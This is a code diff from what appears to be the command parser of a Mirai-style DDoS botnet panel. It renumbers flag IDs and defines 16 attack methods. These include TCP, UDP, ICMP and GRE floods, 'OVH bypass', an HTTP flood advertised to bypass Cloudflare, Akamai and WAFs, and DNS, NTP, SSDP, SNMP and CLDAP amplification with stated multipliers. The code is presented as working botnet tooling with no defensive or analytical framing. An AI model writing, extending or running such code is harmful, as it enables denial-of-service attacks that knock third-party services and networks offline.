@@ -10,6 +10,14 @@ import (
 	"github.com/mattn/go-shellwords"
 )
 
+/* ============================================================================
+ * ATTACK PARSER & BUILDER - 16 Attack Methods
+ * ============================================================================
+ * Layer 4: TCP, UDP, ICMP, GRE, OVH bypass, Amplification
+ * Layer 7: HTTP flood, AXIS-L7 (browser emulation + CF bypass)
+ * Combined: AXIS-TCP, AXIS-UDP (multi-vector attacks)
+ * ============================================================================ */
+
 type AttackInfo struct {
 	attackID          uint8
 	attackFlags       []uint8
@@ -38,53 +46,53 @@ var flagInfoLookup map[string]FlagInfo = map[string]FlagInfo{
 	"sport":     FlagInfo{6, "Source port, default is random"},
 	"dport":     FlagInfo{7, "Destination port, default is random"},
 	"domain":    FlagInfo{8, "Domain name to attack"},
-	"method":    FlagInfo{20, "HTTP method name, default is GET"},
-	"path":      FlagInfo{22, "HTTP path, default is /"},
-	"conns":     FlagInfo{24, "Number of connections"},
-	"source":    FlagInfo{25, "Source IP address, 255.255.255.255 for random"},
-	"url":       FlagInfo{30, "Full HTTP/HTTPS URL (e.g., http://example.com/path)"},
-	"https":     FlagInfo{31, "Use HTTPS/SSL (0 or 1)"},
+	"method":    FlagInfo{9, "HTTP method name, default is GET"},
+	"path":      FlagInfo{11, "HTTP path, default is /"},
+	"conns":     FlagInfo{12, "Number of connections"},
+	"source":    FlagInfo{13, "Source IP address, 255.255.255.255 for random"},
+	"url":       FlagInfo{14, "Full HTTP/HTTPS URL (e.g., http://example.com/path)"},
+	"https":     FlagInfo{15, "Use HTTPS/SSL (0 or 1)"},
 	"useragent": FlagInfo{16, "User-Agent string for HTTP requests"},
 	"cookies":   FlagInfo{17, "Cookies for HTTP requests (for CF bypass)"},
 	"referer":   FlagInfo{18, "Referer header for HTTP requests"},
 	"size":      FlagInfo{0, "Size of packet data (alias for len)"},
 	"port":      FlagInfo{7, "Destination port (alias for dport)"},
-	/* AXIS-L4 specific flags */
-	"tcpport":   FlagInfo{19, "TCP port for AXIS-L4"},
-	"udpport":   FlagInfo{20, "UDP port for AXIS-L4"},
-	"greport":   FlagInfo{21, "GRE port for AXIS-L4"},
+	/* AXIS-TCP/AXIS-UDP specific flags */
+	"tcpport":   FlagInfo{19, "TCP port for AXIS-TCP"},
+	"udpport":   FlagInfo{20, "UDP port for AXIS-UDP"},
+	"greport":   FlagInfo{21, "GRE port for AXIS-TCP/AXIS-UDP"},
 }
 
 /*
- * Attack method IDs - 11 optimized methods (including ULTIMATE)
+ * Attack method IDs - 16 optimized methods
  * Must match bot/attack.h ATK_VEC_* values
  */
 var attackInfoLookup map[string]AttackInfo = map[string]AttackInfo{
 	/* Core Attacks */
-	"tcp":      AttackInfo{0, []uint8{0, 1, 6, 7, 25}, "TCP flood optimized for Gbps"},
-	"udp":      AttackInfo{1, []uint8{0, 1, 6, 7, 25}, "UDP flood optimized for Gbps"},
-	"http":     AttackInfo{2, []uint8{7, 8, 20, 22, 24, 30}, "HTTP flood optimized for RPS"},
+	"tcp":      AttackInfo{0, []uint8{0, 1, 6, 7, 13}, "TCP flood optimized for Gbps"},
+	"udp":      AttackInfo{1, []uint8{0, 1, 6, 7, 13}, "UDP flood optimized for Gbps"},
+	"http":     AttackInfo{2, []uint8{7, 8, 9, 11, 12, 14}, "HTTP flood optimized for RPS"},
 	
 	/* OVH Bypass */
-	"ovhtcp":   AttackInfo{3, []uint8{0, 1, 6, 7, 25}, "TCP with OVH Game bypass"},
-	"ovhudp":   AttackInfo{4, []uint8{0, 1, 6, 7, 25}, "UDP with OVH Game bypass"},
+	"ovhtcp":   AttackInfo{3, []uint8{0, 1, 6, 7, 13}, "TCP with OVH Game bypass"},
+	"ovhudp":   AttackInfo{4, []uint8{0, 1, 6, 7, 13}, "UDP with OVH Game bypass"},
 
 	/* ICMP & GRE */
-	"icmp":     AttackInfo{5, []uint8{0, 25}, "ICMP ping flood (no port needed)"},
-	"greip":    AttackInfo{6, []uint8{0, 1, 6, 7, 25}, "GRE IP flood"},
-	"greeth":   AttackInfo{7, []uint8{0, 1, 6, 7, 25}, "GRE Ethernet flood"},
+	"icmp":     AttackInfo{5, []uint8{0, 13}, "ICMP ping flood (no port needed)"},
+	"greip":    AttackInfo{6, []uint8{0, 1, 6, 7, 13}, "GRE IP flood"},
+	"greeth":   AttackInfo{7, []uint8{0, 1, 6, 7, 13}, "GRE Ethernet flood"},
 
 	/* AXIS Methods */
-	"axis-l7":  AttackInfo{8, []uint8{7, 8, 16, 17, 18, 24, 30, 31}, "AXIS-L7 - Advanced multi-layer bypass (CF, Akamai, WAF)"},
-	"axis-tcp": AttackInfo{9, []uint8{0, 1, 6, 7, 19, 21, 25}, "AXIS-TCP - TCP+OVH-TCP+ICMP+GRE combined attack"},
-	"axis-udp": AttackInfo{10, []uint8{0, 1, 6, 7, 20, 21, 25}, "AXIS-UDP - UDP+AMP+VSE+ICMP+GRE combined attack"},
+	"axis-l7":  AttackInfo{8, []uint8{7, 8, 16, 17, 18, 12, 14, 15}, "AXIS-L7 - Advanced multi-layer bypass (CF, Akamai, WAF)"},
+	"axis-tcp": AttackInfo{9, []uint8{0, 1, 6, 7, 19, 21, 13}, "AXIS-TCP - TCP+OVH-TCP+ICMP+GRE combined attack"},
+	"axis-udp": AttackInfo{10, []uint8{0, 1, 6, 7, 20, 21, 13}, "AXIS-UDP - UDP+AMP+VSE+ICMP+GRE combined attack"},
 
 	/* Amplification Attacks */
-	"dns-amp":  AttackInfo{11, []uint8{6, 25}, "DNS Amplification (50x-100x)"},
-	"ntp-amp":  AttackInfo{12, []uint8{6, 25}, "NTP Amplification (100x-500x)"},
-	"ssdp-amp": AttackInfo{13, []uint8{6, 25}, "SSDP Amplification (30x-50x)"},
-	"snmp-amp": AttackInfo{14, []uint8{6, 25}, "SNMP Amplification (50x-100x)"},
-	"cldap-amp": AttackInfo{15, []uint8{6, 25}, "CLDAP Amplification (50x-70x)"},
+	"dns-amp":  AttackInfo{11, []uint8{6, 13}, "DNS Amplification (50x-100x)"},
+	"ntp-amp":  AttackInfo{12, []uint8{6, 13}, "NTP Amplification (100x-500x)"},
+	"ssdp-amp": AttackInfo{13, []uint8{6, 13}, "SSDP Amplification (30x-50x)"},
+	"snmp-amp": AttackInfo{14, []uint8{6, 13}, "SNMP Amplification (50x-100x)"},
+	"cldap-amp": AttackInfo{15, []uint8{6, 13}, "CLDAP Amplification (50x-70x)"},
 }
 
 func uint8InSlice(a uint8, list []uint8) bool {
